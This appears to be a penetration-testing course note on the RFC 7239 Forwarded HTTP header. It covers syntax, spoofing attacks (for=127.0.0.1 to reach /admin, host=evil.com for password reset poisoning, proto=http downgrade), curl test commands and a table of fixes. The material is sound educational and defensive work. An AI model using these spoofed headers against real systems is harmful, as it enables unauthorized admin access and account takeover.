---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.12 Forwarded — RFC 7239, Abuse Patterns"
---

# 03.12 — Forwarded

## What is it?

`Forwarded` is the RFC 7239 standardized replacement for the patchwork of `X-Forwarded-For`, `X-Forwarded-Host`, and `X-Forwarded-Proto` headers. It uses a structured format. Despite being the standard, most real-world deployments still use the X-Forwarded-* headers, so both are important in VAPT.

---

## Syntax

```
Forwarded: for=1.2.3.4; by=5.5.5.5; host=target.com; proto=https

Components:
  for=   → client IP (maps to X-Forwarded-For)
  by=    → proxy IP that added the header
  host=  → original Host header (maps to X-Forwarded-Host)
  proto= → original protocol (maps to X-Forwarded-Proto)

IPv6:
  Forwarded: for="[::1]"    ← IPv6 in quotes

Multiple proxies:
  Forwarded: for=1.2.3.4, for=5.6.7.8   ← comma-separated chain
```

---

## Attack: IP Spoofing via Forwarded Header

```
SCENARIO: App reads Forwarded: for= for IP-based access control.

ATTACK:
  GET /admin HTTP/1.1
  Forwarded: for=127.0.0.1    ← appear as localhost!
  
  → Admin access!

COMBINED ATTACK (try all headers):
  Forwarded: for=127.0.0.1; proto=https; host=admin.internal
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 127.0.0.1
```

---

## Attack: Host Override via Forwarded

```
Forwarded: host=admin.target.com; for=1.2.3.4

If app reads the host= component to determine which virtual host to serve:
→ Same as Host header injection but via Forwarded!

Password reset poisoning:
  Forwarded: host=evil.com
  → Password reset email goes to evil.com!
```

---

## Attack: Protocol Downgrade via Forwarded

```
Forwarded: proto=http; for=1.2.3.4

If app enforces HTTPS by checking Forwarded: proto:
→ Set to http → bypass HTTPS redirect!
→ Bypass Secure cookie flag check!
```

---

## Testing

```bash
# IP bypass via Forwarded
curl -H "Forwarded: for=127.0.0.1" https://target.com/admin
curl -H "Forwarded: for=127.0.0.1; proto=https" https://target.com/admin

# Host override via Forwarded
curl -H "Forwarded: host=admin.target.com; for=1.2.3.4" https://target.com/

# Protocol downgrade
curl -H "Forwarded: proto=http; for=1.2.3.4" https://target.com/
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Trusting Forwarded for= for access control | Use real TCP connection IP; strip client-supplied Forwarded |
| Trusting Forwarded host= for routing | Validate against configured allowlist |
| Trusting Forwarded proto= for HTTPS detection | Use actual TLS status at the proxy |

---

## Related Notes
- [[02 - X-Forwarded-For]] — IP forwarding (non-standard but prevalent)
- [[03 - X-Forwarded-Host]] — Host forwarding header
- [[04 - X-Forwarded-Proto]] — Protocol forwarding header
- [[13 - Via]] — proxy chain disclosure header
